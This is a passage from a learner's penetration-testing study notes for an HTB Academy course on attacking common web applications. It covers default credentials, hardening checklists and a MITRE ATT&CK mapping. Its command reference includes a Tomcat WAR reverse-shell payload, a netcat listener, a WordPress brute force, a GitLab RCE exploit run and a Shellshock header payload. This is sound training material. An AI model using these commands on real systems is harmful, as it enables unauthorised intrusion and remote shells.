# Inspect memory at the connection string location
gdb-peda$ x/s $rsi

# Alternatively -- use strings to find connection strings
Hackerpatel007_1@htb[/htb]$ strings octopus_checker | grep -i "driver\|server\|uid\|pwd\|password"

Driver={ODBC Driver 17 for SQL Server};Server=<SERVER>;UID=<USER>;PWD=<PASSWORD>
```

---

## Other Notable Applications

| Application | Default Credentials | Attack Vector |
|-------------|---------------------|---------------|
| **Axis2** | `admin:axis2` | AAR file upload → web shell |
| **WebSphere** | `system:manager` | WAR deployment → web shell |
| **Elasticsearch** | None | Unauthenticated REST API → data access |
| **Zabbix** | `admin:zabbix` | API → command execution |
| **Nagios** | `nagiosadmin:PASSW0RD` | CSRF, SQL injection, stored XSS |
| **WebLogic** | `weblogic:weblogic1` | Java deserialization RCE |
| **DNN (DotNetNuke)** | `admin:admin` | File upload bypass, XSS |
| **vCenter** | `admin@vsphere.local` | Apache Struts RCE, OVA file upload RCE |
| **Nexus Repository** | `admin:admin123` | API → RCE (Groovy scripting) |

---

## Application Hardening

### General Hardening Checklist

| Control | Implementation |
|---------|---------------|
| **Asset Inventory** | Maintain accurate list of all internal and external applications |
| **Strong Authentication** | Enforce strong passwords; change all default credentials |
| **MFA** | Enable 2FA for all admin accounts at minimum |
| **Access Control** | Restrict admin interfaces to internal IPs or VPN only |
| **Disable Unsafe Features** | PHP editor in WordPress, Script Console in Jenkins |
| **Regular Updates** | Apply vendor patches promptly; subscribe to security advisories |
| **Backups** | Regular off-site backups — test restoration procedures |
| **Security Monitoring** | Deploy WAF (ModSecurity/Cloudflare), integrate Sysmon |
| **Least Privilege** | Run applications as low-privilege service accounts |

### Application-Specific Hardening

| Application | Key Control |
|-------------|------------|
| WordPress | Install WordFence; disable file editing via `define('DISALLOW_FILE_EDIT', true)` |
| Joomla | Require secret key for admin URL via AdminExile plugin |
| Drupal | Hide/move admin login page; disable `PHP filter` module |
| Tomcat | Restrict `/manager` to localhost; change default credentials |
| Jenkins | Enable Matrix Authorization; disable anonymous access |
| Splunk | License properly to enforce auth; change `admin:changeme` |
| PRTG | Update to 18.2.39+; change `prtgadmin:prtgadmin` |
| GitLab | Require admin approval for signups; enforce 2FA |
| osTicket | Restrict internet access; enforce agent authentication |

---

## Key Tools Reference

| Command | Purpose |
|---------|---------|
| `nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Initial web application discovery scan |
| `eyewitness --xml web_discovery.xml -d screenshots` | Screenshot all discovered web applications |
| `cat web_discovery.xml \| aquatone -nmap -out aquatone_report` | Alternative web screenshotting with Aquatone |
| `wpscan --url http://TARGET --enumerate --api-token TOKEN` | Full WordPress enumeration |
| `wpscan --password-attack xmlrpc -t 20 -U user -P rockyou.txt --url http://TARGET` | WordPress credential brute force |
| `droopescan scan joomla -u http://TARGET` | Joomla enumeration |
| `droopescan scan drupal -u http://TARGET` | Drupal enumeration |
| `curl -s http://TARGET \| grep Drupal` | Confirm Drupal and version |
| `use auxiliary/scanner/http/tomcat_mgr_login` | Brute force Tomcat Manager credentials |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f war > shell.war` | Generate Tomcat WAR web shell |
| `nc -lvnp 8443` | Start reverse shell listener |
| `tar -cvzf updater.tar.gz splunk_shell/` | Package Splunk custom app for upload |
| `crackmapexec smb TARGET -u prtgadm1n -p P@ssw0rd` | Verify PRTG admin user creation |
| `./gitlab_userenum.sh --url http://TARGET --userlist users.txt` | Enumerate valid GitLab usernames |
| `python3 gitlab_13_10_2_rce.py -t http://TARGET -u user -p pass -c 'cmd'` | GitLab RCE exploit (CVE-2021-22205) |
| `gobuster dir -u http://TARGET/cgi-bin/ -w wordlist.txt -x cgi` | Find CGI scripts for Shellshock |
| `curl -s -A "() { :;}; echo Content-Type: text/plain; echo; id" http://TARGET/cgi-bin/script.cgi` | Test Shellshock via User-Agent |
| `java -jar iis_shortname_scanner.jar 2 20 http://TARGET/` | IIS tilde enumeration |
| `searchsploit adobe coldfusion` | Find ColdFusion exploits |
| `python2 14641.py TARGET PORT PATH` | ColdFusion directory traversal |
| `gdb ./binary` | Debug binary to extract hardcoded credentials |
| `strings binary \| grep -i "pass\|user\|server\|connect"` | Extract strings from binary |
| `ldapsearch -H ldap://TARGET:389 -D "cn=admin,dc=example,dc=com" -w pass -b "dc=example,dc=com" filter` | LDAP query for enumeration |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — all direct application exploits |
| T1078 | T1078.001 | Valid Accounts: Default Accounts — Tomcat, PRTG, Jenkins, Splunk default credentials |
| T1110 | T1110.001 | Brute Force: Password Guessing — WPScan xmlrpc, Tomcat Manager login brute force |
| T1505 | T1505.003 | Server Software Component: Web Shell — WAR upload (Tomcat), theme/template editor (WP/Joomla/Drupal), Splunk custom app |
| T1059 | T1059.001 | Command and Scripting Interpreter: PowerShell — Splunk reverse shell, PRTG notification injection |
| T1059 | T1059.007 | Command and Scripting Interpreter: JavaScript — Jenkins Groovy script console RCE |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — Shellshock CGI exploitation |
| T1083 | — | File and Directory Discovery — IIS tilde enumeration, ColdFusion directory traversal |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — GitLab repository credential hunting, thick client hardcoded strings |
| T1552 | T1552.004 | Unsecured Credentials: Private Keys — GitLab repository SSH key discovery |
| T1213 | — | Data from Information Repositories — GitLab public/internal repo data mining |
| T1056 | T1056.003 | Input Capture: Web Portal Capture — osTicket email harvesting for account registration |
| T1601 | T1601.001 | Modify System Image — Drupal backdoored module upload |
| T1027 | T1027.002 | Obfuscated Files or Information: Software Packing — JAR manifest SHA-256 bypass in thick client |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
